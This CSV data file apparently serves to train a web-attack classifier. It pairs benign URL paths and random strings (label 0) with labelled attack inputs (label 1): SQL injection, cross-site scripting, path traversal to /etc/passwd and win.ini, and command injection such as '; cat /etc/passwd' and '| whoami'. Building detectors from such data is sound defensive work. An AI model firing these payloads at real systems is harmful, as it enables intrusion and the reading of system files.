payload,label
/login?id=8806,0
login,0
' OR 3=4 --,1
' OR 4=6 --,1
about,0
admin%00' OR 1=1,1
' OR 9=7 --,1
; cat /etc/passwd,1
61cBAD5dvfIxLv,0
/profile?id=3741,0
dashboard,0
dashboard,0
about,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=20;alert(a)</script>,1
<script>var a=145;alert(a)</script>,1
/home?session=10211,0
/about?id=6561,0
../../../windows/win.ini,1
5k1GnYnYiqJm,0
' OR '1'='1,1
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?session=43559,0
cart,0
qV5S4RP7,0
<script>var a=328;alert(a)</script>,1
' OR 3=3 --,1
/user?id=3696,0
/checkout?session=96559,0
vDkq2NdsLNjIOIq,0
; cat /etc/passwd,1
| whoami,1
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
about,0
/home?id=1479,0
onerror=alert(1),1
/search?session=12751,0
s E l E c T * f R o M a d m i n,1
settings,0
' OR 5=9 --,1
/profile?session=18204,0
<script>alert(document.cookie)</script>,1
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
onerror=alert(1),1
login,0
<script>var a=154;alert(a)</script>,1
<script>var a=39;alert(a)</script>,1
admin' --,1
../../../windows/win.ini,1
register,0
zhdYHXhFWYJJK3F,0
cart,0
<script>var a=765;alert(a)</script>,1
' OR 1=7 --,1
blog,0
<script>var a=410;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
' OR 2=1 --,1
about,0
admin'/* bypass */OR 1=1,1
/checkout?session=54049,0
dU1XOuOd8SfgrvV,0
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
RBRq66YmZHvsUXq,0
../../../windows/win.ini,1
/search?id=8429,0
/index?session=69725,0
profile,0
' OR 3=4 --,1
' OR 8=1 --,1
admin'/* bypass */OR 1=1,1
admin'/* bypass */OR 1=1,1
' OR 4=9 --,1
Sv2nXkwyem2xd7a,0
i1COYL2ZPpu,0
<script>alert(document.cookie)</script>,1
<script>var a=987;alert(a)</script>,1
/settings?id=9878,0
<script>var a=295;alert(a)</script>,1
/register?id=7462,0
../../../../etc/passwd,1
' OR 9=5 --,1
../../../../etc/passwd,1
' OR 7=1 --,1
GgObRhuh489OPu,0
' OR 8=6 --,1
../../../windows/win.ini,1
/settings?session=95821,0
' OR '1'='1,1
/login?session=47732,0
admin'/* bypass */OR 1=1,1
' OR 5=2 --,1
1xPffe7bnRZQ1vf,0
| whoami,1
/contact?session=94257,0
/user?session=27247,0
' OR 8=4 --,1
/search?id=3110,0
admin' --,1
1' o r '1'='1,1
i2WnaK9JygfcW,0
<script>var a=544;alert(a)</script>,1
s3eVctV5,0
/settings?id=3753,0
/user?id=9503,0
1' o r '1'='1,1
register,0
' OR 9=6 --,1
<script>var a=734;alert(a)</script>,1
admin' --,1
<script>var a=500;alert(a)</script>,1
0GeZqpEG,0
<script>var a=999;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
blog,0
javascript:alert(1),1
admin' --,1
<script>var a=722;alert(a)</script>,1
/login?session=89467,0
<script>var a=953;alert(a)</script>,1
/user?session=25267,0
/register?id=8565,0
' OR 4=4 --,1
' OR 5=9 --,1
search,0
/login?id=3254,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
' OR 1=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=3935,0
' OR 5=2 --,1
javascript:alert(1),1
; cat /etc/passwd,1
<script>var a=254;alert(a)</script>,1
/search?id=5248,0
about,0
5sH6cKUC4ff9,0
' OR 7=9 --,1
QkHaU8hmJwe,0
| whoami,1
1' o r '1'='1,1
rucIYFNjCv1Y,0
admin'/* bypass */OR 1=1,1
/home?session=69654,0
biTMZ8jdczzJoz8,0
<script>var a=83;alert(a)</script>,1
/checkout?session=91245,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
OklSX3XD0DcHJ54,0
' OR 5=6 --,1
search,0
/about?id=7061,0
' OR 6=1 --,1
/search?id=2790,0
' OR '1'='1,1
checkout,0
| whoami,1
<script>var a=866;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
user,0
<script>var a=912;alert(a)</script>,1
checkout,0
' OR '1'='1,1
admin%00' OR 1=1,1
javascript:alert(1),1
' OR '1'='1,1
<script>var a=735;alert(a)</script>,1
HCpXgZR6YGo,0
nZ56BvDVh51,0
/settings?id=6684,0
about,0
/cart?id=6849,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
FOE5kgDb4Z,0
40Wq26Kzb,0
' OR 1=1 --,1
/search?session=66190,0
<script>var a=351;alert(a)</script>,1
../../../windows/win.ini,1
' OR 7=5 --,1
/contact?id=3330,0
cart,0
vUFX5sPq,0
about,0
' OR 9=1 --,1
<script>var a=914;alert(a)</script>,1
index,0
search,0
1' o r '1'='1,1
' OR 6=4 --,1
<script>var a=974;alert(a)</script>,1
search,0
admin'/* bypass */OR 1=1,1
checkout,0
/register?id=3582,0
home,0
HNsihHr4,0
/user?session=36092,0
admin'/* bypass */OR 1=1,1
/about?session=20041,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=67686,0
/dashboard?id=1410,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=6 --,1
jRIyf141Vri,0
/checkout?id=5330,0
Ubkd2S1FNzIrc8j,0
cart,0
/blog?session=19169,0
' OR 5=9 --,1
/about?session=87693,0
/login?session=21914,0
7yHh7hX0d7z,0
QaBI26JSDY9e,0
/checkout?id=3977,0
home,0
' OR '1'='1,1
F78PNnEgR,0
M1vTqnIP,0
prxLAnAQuf,0
jQydoK31,0
admin%00' OR 1=1,1
<script>var a=865;alert(a)</script>,1
' OR 4=3 --,1
kjFLJzDcIgkno,0
' OR 5=4 --,1
7rfba6rcLOR92Pi,0
<script>var a=58;alert(a)</script>,1
register,0
<script>var a=789;alert(a)</script>,1
s6eW53Dx,0
onerror=alert(1),1
home,0
/search?id=4418,0
' OR 2=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
search,0
' OR 1=1 --,1
' OR 1=1 --,1
/about?session=27448,0
' OR 8=9 --,1
ndmWz4vzC7,0
register,0
/about?id=7054,0
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
home,0
javascript:alert(1),1
<script>var a=599;alert(a)</script>,1
u7GUlPNKnP,0
; cat /etc/passwd,1
/user?session=58404,0
<script>var a=614;alert(a)</script>,1
/search?session=45163,0
/register?id=7642,0
8gTHJKma57E,0
' OR 9=8 --,1
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?id=1460,0
admin' --,1
/about?session=13603,0
/profile?session=13335,0
/login?session=88866,0
1Q5U5iSYqI3dMQ,0
/search?session=36153,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
RH2m4qMANr87oMe,0
' OR 7=4 --,1
/index?id=2519,0
javascript:alert(1),1
' OR 9=5 --,1
<script>var a=756;alert(a)</script>,1
1' o r '1'='1,1
<script>var a=477;alert(a)</script>,1
../../../windows/win.ini,1
<script>var a=313;alert(a)</script>,1
search,0
' OR 7=2 --,1
j6CJnGiujWTiJ,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=391;alert(a)</script>,1
/user?session=17969,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=556;alert(a)</script>,1
/login?session=94436,0
' OR 1=1 --,1
| whoami,1
../../../../etc/passwd,1
/blog?session=67086,0
/profile?id=9007,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
home,0
1' o r '1'='1,1
SKumG6H6,0
/index?session=30413,0
' OR 9=5 --,1
; cat /etc/passwd,1
/blog?session=84715,0
' OR '1'='1,1
<script>var a=465;alert(a)</script>,1
../../../windows/win.ini,1
admin%00' OR 1=1,1
/search?session=50944,0
' OR 9=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=92831,0
/about?session=32920,0
oZJceN3kjXTc,0
/cart?id=9368,0
/settings?session=77416,0
/settings?session=77240,0
1' o r '1'='1,1
<script>var a=948;alert(a)</script>,1
; cat /etc/passwd,1
; cat /etc/passwd,1
about,0
HyXWgtldNKXCH6R,0
../../../windows/win.ini,1
' OR 1=1 --,1
/user?session=47915,0
' OR 1=1 --,1
wa0GcSYMVJcc,0
o6frGl0SLV,0
onerror=alert(1),1
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
/settings?session=33669,0
PoaVWcZR8,0
; cat /etc/passwd,1
/index?session=29716,0
hF7QSmVDt1sa,0
admin' --,1
QnetbRFBBi77pT,0
<script>var a=366;alert(a)</script>,1
czXKb63V,0
s E l E c T * f R o M a d m i n,1
jLypPxMqRNeU,0
/dashboard?id=4900,0
<script>alert(document.cookie)</script>,1
' OR 3=9 --,1
9hxiwign3956Z,0
1' o r '1'='1,1
<script>var a=857;alert(a)</script>,1
/contact?session=20269,0
' OR 1=9 --,1
/profile?id=5446,0
zcgPxRp2lm,0
user,0
' OR '1'='1,1
' OR 9=6 --,1
8uRUY4Jh46kVfp,0
<script>var a=790;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?session=76682,0
../../../../etc/passwd,1
../../../windows/win.ini,1
login,0
1' o r '1'='1,1
blog,0
' OR 1=1 --,1
Yp78cnI44Tb3,0
3thJ8CkPyFm,0
/about?session=51139,0
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
MwWFH5F48Ki8VR,0
../../../windows/win.ini,1
' OR 9=6 --,1
<script>var a=404;alert(a)</script>,1
1' o r '1'='1,1
ZnDF1u4jpff,0
' OR 3=8 --,1
' OR 3=5 --,1
/dashboard?session=92553,0
s E l E c T * f R o M a d m i n,1
/settings?session=29739,0
/user?id=3630,0
/login?session=80858,0
login,0
TaRuc8ozx,0
/checkout?id=7025,0
<script>alert(document.cookie)</script>,1
profile,0
s E l E c T * f R o M a d m i n,1
/register?session=59634,0
| whoami,1
/register?id=2895,0
cart,0
kDfGv4BFHTrXJ,0
admin%00' OR 1=1,1
sTLsj4JKadLG9f,0
<script>var a=550;alert(a)</script>,1
' OR 7=7 --,1
/settings?session=49573,0
' OR 6=4 --,1
' OR 1=1 --,1
fyUKKmo5I17Nxpr,0
blog,0
/login?id=4356,0
blog,0
/login?id=8326,0
/contact?session=85687,0
/login?session=48512,0
N7Pcv6SdxT3,0
<script>var a=846;alert(a)</script>,1
| whoami,1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=28544,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
' OR '1'='1,1
3WdIYsQjx0Z4cS,0
MJEn5GHeybDO,0
onerror=alert(1),1
/contact?session=67013,0
/about?id=6739,0
| whoami,1
<script>var a=472;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 9=8 --,1
heCrqIS3c5,0
dashboard,0
enPRPFy2RwE7per,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=84692,0
<script>var a=851;alert(a)</script>,1
/register?id=2434,0
search,0
<script>var a=921;alert(a)</script>,1
<script>var a=479;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 2=1 --,1
' OR 6=3 --,1
/settings?session=87047,0
/login?session=69862,0
onerror=alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=327;alert(a)</script>,1
/about?id=6536,0
user,0
RGeU1zR4Gw,0
VMDlA9sS6G6ji,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=951;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?id=4416,0
/checkout?id=6591,0
onerror=alert(1),1
<script>var a=858;alert(a)</script>,1
/contact?id=2482,0
../../../../etc/passwd,1
javascript:alert(1),1
/profile?session=88646,0
/checkout?session=50315,0
<script>var a=665;alert(a)</script>,1
1' o r '1'='1,1
/blog?session=73395,0
heFXUAHzE507xR,0
register,0
../../../../etc/passwd,1
admin' --,1
about,0
admin%00' OR 1=1,1
user,0
<script>alert(document.cookie)</script>,1
/search?session=21382,0
' OR 2=9 --,1
fmBphDATvkp77f,0
search,0
<script>var a=547;alert(a)</script>,1
/register?id=5492,0
/cart?session=68892,0
contact,0
javascript:alert(1),1
../../../windows/win.ini,1
/home?id=9941,0
/cart?session=12589,0
../../../../etc/passwd,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
/user?id=544,0
<script>var a=967;alert(a)</script>,1
' OR 4=8 --,1
/settings?session=25846,0
' OR 6=5 --,1
checkout,0
register,0
<script>var a=744;alert(a)</script>,1
UTuKWkwM,0
/search?session=30780,0
/cart?id=1088,0
onerror=alert(1),1
/about?id=1842,0
1' o r '1'='1,1
i1TaAJDRa,0
/home?id=9462,0
<script>alert(document.cookie)</script>,1
<script>var a=756;alert(a)</script>,1
/index?session=33915,0
/checkout?id=6756,0
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
/settings?session=58227,0
' OR '1'='1,1
' OR 9=8 --,1
zjwgnGcQZY,0
cart,0
onerror=alert(1),1
../../../../etc/passwd,1
' OR '1'='1,1
Q4mIICLb,0
../../../../etc/passwd,1
/settings?id=2210,0
' OR 5=4 --,1
admin'/* bypass */OR 1=1,1
/settings?session=76721,0
login,0
B3ak906qvkmXMr,0
/settings?session=17295,0
<script>var a=161;alert(a)</script>,1
' OR 3=7 --,1
' OR 4=1 --,1
<script>var a=179;alert(a)</script>,1
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
<script>var a=648;alert(a)</script>,1
/about?id=9315,0
' OR 4=7 --,1
admin' --,1
about,0
MOMnHBPo2LTr,0
/cart?session=10781,0
/contact?session=18267,0
' OR 1=2 --,1
/home?session=78841,0
../../../../etc/passwd,1
/cart?session=54142,0
index,0
index,0
admin' --,1
' OR 5=8 --,1
; cat /etc/passwd,1
/about?session=84720,0
/checkout?id=1583,0
onerror=alert(1),1
aDvjZBMB4RW3R6F,0
settings,0
' OR 4=8 --,1
admin'/* bypass */OR 1=1,1
/index?id=496,0
YMAq5K5Kwn,0
dashboard,0
<script>var a=873;alert(a)</script>,1
1' o r '1'='1,1
oPnDRgZUFb,0
' OR 3=3 --,1
/cart?id=4408,0
<script>var a=66;alert(a)</script>,1
MesicrlY4s7,0
/login?session=38325,0
/login?id=5847,0
/cart?session=57911,0
' OR 8=6 --,1
/contact?session=25676,0
/register?session=14194,0
profile,0
/settings?session=27187,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/blog?id=6359,0
home,0
| whoami,1
blog,0
' OR 4=7 --,1
' OR 7=4 --,1
jnVtt0xLtKsQK4,0
/home?id=6516,0
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
| whoami,1
' OR '1'='1,1
../../../../etc/passwd,1
register,0
<script>var a=912;alert(a)</script>,1
checkout,0
<script>var a=861;alert(a)</script>,1
GO0tIlNhj,0
' OR 6=4 --,1
blog,0
; cat /etc/passwd,1
NGOe2k0FjCuPTN,0
/home?session=31815,0
<script>var a=849;alert(a)</script>,1
/about?id=2003,0
register,0
dashboard,0
/search?session=48845,0
dashboard,0
/cart?session=66873,0
' OR 1=3 --,1
<script>var a=991;alert(a)</script>,1
' OR 1=1 --,1
; cat /etc/passwd,1
<script>var a=471;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
<script>var a=328;alert(a)</script>,1
/dashboard?session=29406,0
/cart?session=69905,0
' OR 4=7 --,1
/about?session=34880,0
zCaf4VcmhdoO,0
<script>var a=753;alert(a)</script>,1
../../../../etc/passwd,1
' OR 3=3 --,1
<script>var a=129;alert(a)</script>,1
<script>var a=297;alert(a)</script>,1
eAC2DDNMqtq,0
/home?session=70607,0
<script>var a=934;alert(a)</script>,1
| whoami,1
' OR 5=3 --,1
oVEapqNnsQlI0,0
/settings?session=95477,0
s E l E c T * f R o M a d m i n,1
checkout,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=5 --,1
<script>var a=229;alert(a)</script>,1
<script>var a=949;alert(a)</script>,1
<script>var a=268;alert(a)</script>,1
<script>var a=89;alert(a)</script>,1
onerror=alert(1),1
c7jue9jStANQ,0
/profile?session=69108,0
YApiAiLGf,0
/index?id=4525,0
' OR 7=6 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
0JDPPL4XFQb0,0
' OR '1'='1,1
' OR 2=5 --,1
ghWV9irmkzLJ,0
onerror=alert(1),1
/user?id=4551,0
' OR 1=1 --,1
/checkout?session=56985,0
admin'/* bypass */OR 1=1,1
/search?id=6569,0
blog,0
CYnayHF189,0
register,0
home,0
/user?session=74988,0
search,0
search,0
' OR 7=3 --,1
/checkout?session=18924,0
/index?session=96600,0
login,0
../../../windows/win.ini,1
<script>var a=861;alert(a)</script>,1
/contact?id=413,0
/register?id=5823,0
/blog?session=35028,0
register,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=798;alert(a)</script>,1
/login?session=98346,0
' OR 1=1 --,1
' OR '1'='1,1
admin%00' OR 1=1,1
HIAq2OVA,0
' OR 7=5 --,1
/profile?session=15591,0
admin' --,1
about,0
' OR '1'='1,1
XtkfA7F1MYVIu2,0
admin'/* bypass */OR 1=1,1
/dashboard?session=32121,0
/blog?session=48331,0
' OR '1'='1,1
../../../../etc/passwd,1
/index?session=74477,0
../../../../etc/passwd,1
/cart?session=87872,0
<script>var a=303;alert(a)</script>,1
/login?id=178,0
' OR 2=2 --,1
about,0
/contact?session=46123,0
mDKQVgDAq1tW11f,0
settings,0
NoIUGXQFfax2,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?session=89132,0
BJOKgIxkcipF8,0
/contact?session=80465,0
/settings?id=3688,0
javascript:alert(1),1
settings,0
admin'/* bypass */OR 1=1,1
U5ejIG3GF,0
settings,0
/profile?session=91661,0
/settings?session=64927,0
; cat /etc/passwd,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
/profile?session=56265,0
<script>var a=800;alert(a)</script>,1
/about?id=9446,0
/register?id=4872,0
/home?session=29406,0
admin' --,1
s E l E c T * f R o M a d m i n,1
/dashboard?session=91124,0
<script>var a=387;alert(a)</script>,1
<script>var a=647;alert(a)</script>,1
' OR 4=8 --,1
/index?id=2571,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?id=3832,0
admin' --,1
dashboard,0
y9nUTPBvq,0
4juT9lGccA,0
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
user,0
y22ngVouTOlwMbm,0
onerror=alert(1),1
<script>var a=254;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
RJ8oFPeQGBWhZ,0
' OR 6=6 --,1
s E l E c T * f R o M a d m i n,1
' OR 1=3 --,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=1 --,1
CrCZzVu1cNYZF,0
/home?id=1152,0
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
xdsQ4morHM3D,0
1' o r '1'='1,1
/register?session=44385,0
nHf5NgKvs8,0
checkout,0
' OR 1=1 --,1
' OR 2=7 --,1
Zvz83USLfiYG,0
javascript:alert(1),1
' OR 1=1 --,1
/blog?id=6908,0
settings,0
home,0
index,0
/settings?session=96986,0
<script>alert(document.cookie)</script>,1
/index?id=309,0
cart,0
sOQL2JqHFbjwdp,0
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
user,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
javascript:alert(1),1
../../../windows/win.ini,1
/dashboard?id=5839,0
UNHVePJUgOFgC1,0
admin' --,1
/contact?session=12796,0
' OR '1'='1,1
/cart?session=60989,0
admin' --,1
home,0
Nk8YcJRu,0
GdN4YHad,0
admin%00' OR 1=1,1
/register?id=2778,0
/blog?id=7887,0
settings,0
/login?id=6384,0
contact,0
' OR '1'='1,1
<script>var a=587;alert(a)</script>,1
9XRIkA5BU6p,0
profile,0
TwpuWcwSNjq6qrQ,0
/blog?session=82075,0
' OR 2=9 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
T2lD9oGy3Mw,0
' OR 8=5 --,1
/register?id=4446,0
' OR '1'='1,1
/settings?session=42105,0
/settings?id=5414,0
../../../../etc/passwd,1
/blog?id=7446,0
../../../windows/win.ini,1
/blog?id=4292,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=396;alert(a)</script>,1
index,0
RO6CopdN,0
<script>var a=593;alert(a)</script>,1
' OR 1=8 --,1
/blog?id=4061,0
' OR 7=6 --,1
| whoami,1
/contact?id=1463,0
<script>var a=417;alert(a)</script>,1
admin' --,1
lqK4IYrTX,0
; cat /etc/passwd,1
J00WqHXvDUuQouK,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/register?id=6517,0
nv91AlQochN,0
ASPATj5iH,0
/settings?session=44030,0
contact,0
cart,0
/home?session=41840,0
../../../../etc/passwd,1
Nv5wlQFYd,0
javascript:alert(1),1
' OR 7=6 --,1
<script>var a=185;alert(a)</script>,1
register,0
/cart?session=61231,0
/login?session=97994,0
<script>var a=146;alert(a)</script>,1
3Js90sRg,0
<script>var a=159;alert(a)</script>,1
' OR 6=4 --,1
/register?id=6918,0
' OR '1'='1,1
/register?session=82301,0
' OR 6=7 --,1
login,0
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
4gsk2wQTuF,0
login,0
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
/contact?session=83466,0
../../../windows/win.ini,1
/dashboard?session=83624,0
/blog?session=53316,0
/blog?session=49720,0
' OR 1=1 --,1
zGHwh1Gr0,0
../../../windows/win.ini,1
../../../../etc/passwd,1
/login?id=8704,0
' OR 4=1 --,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
/user?session=86126,0
<script>var a=272;alert(a)</script>,1
/settings?id=6809,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=483;alert(a)</script>,1
/dashboard?id=4647,0
| whoami,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
/profile?session=31950,0
1' o r '1'='1,1
about,0
checkout,0
/search?id=1052,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
<script>var a=587;alert(a)</script>,1
| whoami,1
xam4ABpT5w32,0
admin' --,1
/settings?session=64972,0
/index?id=9698,0
1' o r '1'='1,1
JCckjXyNbmmMNou,0
/index?id=9835,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=3 --,1
/user?session=70227,0
Rfep4Y8S5Tm3,0
<script>var a=920;alert(a)</script>,1
/cart?id=6218,0
/blog?session=57614,0
/user?session=59751,0
about,0
| whoami,1
1' o r '1'='1,1
| whoami,1
/register?session=75515,0
/login?session=31198,0
/index?session=98417,0
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?id=8897,0
admin'/* bypass */OR 1=1,1
user,0
' OR 5=4 --,1
/about?id=614,0
/profile?id=5845,0
<script>alert(document.cookie)</script>,1
/search?id=5292,0
p11ty3NavkuSh,0
/register?session=15612,0
/dashboard?session=62637,0
/home?session=26494,0
Tjb1zmwtDEwrEyV,0
/dashboard?id=4602,0
| whoami,1
<script>var a=607;alert(a)</script>,1
<script>var a=748;alert(a)</script>,1
blog,0
/about?id=4963,0
admin'/* bypass */OR 1=1,1
/about?id=2420,0
yOiXlxum7mAY6,0
1XnNuvEL66X,0
<script>var a=466;alert(a)</script>,1
index,0
SFuhCeqp9100rT,0
' OR '1'='1,1
' OR 3=8 --,1
/cart?session=99087,0
/home?id=2041,0
| whoami,1
' OR 2=7 --,1
/contact?id=5115,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
yDP803hCxMF3,0
../../../windows/win.ini,1
dashboard,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
admin%00' OR 1=1,1
bWWyeWkh7zc5SyR,0
<script>var a=317;alert(a)</script>,1
cart,0
' OR 7=9 --,1
/contact?session=15150,0
<script>var a=65;alert(a)</script>,1
/profile?id=9609,0
contact,0
/about?id=7403,0
profile,0
/blog?session=39111,0
/blog?session=91078,0
' OR 1=1 --,1
javascript:alert(1),1
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
' OR 8=9 --,1
4HS0GIFzPRT3aCQ,0
../../../../etc/passwd,1
w5kTM6C7tpiyxI,0
Rpq5hF62,0
' OR 1=1 --,1
admin%00' OR 1=1,1
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
checkout,0
QBa3NRPVH,0
home,0
' OR 1=1 --,1
/profile?id=7524,0
/user?id=6558,0
javascript:alert(1),1
' OR 7=7 --,1
onerror=alert(1),1
/profile?session=85892,0
javascript:alert(1),1
profile,0
bPtmHcY347sPj,0
/register?id=8831,0
/about?session=97968,0
/profile?id=568,0
/contact?session=85437,0
<script>var a=686;alert(a)</script>,1
/login?id=1010,0
/search?id=6924,0
<script>var a=734;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=197;alert(a)</script>,1
' OR 6=9 --,1
../../../windows/win.ini,1
/blog?id=2530,0
' OR 8=8 --,1
' OR 6=7 --,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=93025,0
checkout,0
/about?session=14219,0
/index?id=1697,0
Fidx2A53,0
' OR 1=1 --,1
about,0
/blog?session=16264,0
/dashboard?id=7474,0
<script>var a=750;alert(a)</script>,1
QplqgIqosu9,0
eYrOyd5lLyZDZ6S,0
; cat /etc/passwd,1
/search?id=3963,0
42rU8fqu,0
<script>var a=938;alert(a)</script>,1
| whoami,1
' OR 1=2 --,1
../../../windows/win.ini,1
<script>var a=875;alert(a)</script>,1
7b9wWq0a,0
<script>var a=408;alert(a)</script>,1
' OR '1'='1,1
/index?id=8256,0
/settings?id=891,0
UgFoYYNvsB,0
register,0
' OR 7=8 --,1
/blog?id=283,0
/contact?session=23135,0
admin'/* bypass */OR 1=1,1
bruv8a3ykMyddV,0
; cat /etc/passwd,1
' OR 4=1 --,1
/profile?session=17495,0
checkout,0
contact,0
' OR 6=7 --,1
/home?id=7418,0
settings,0
/search?id=7905,0
onerror=alert(1),1
' OR 1=8 --,1
r4pr8YkL,0
javascript:alert(1),1
z0vg8TeA,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
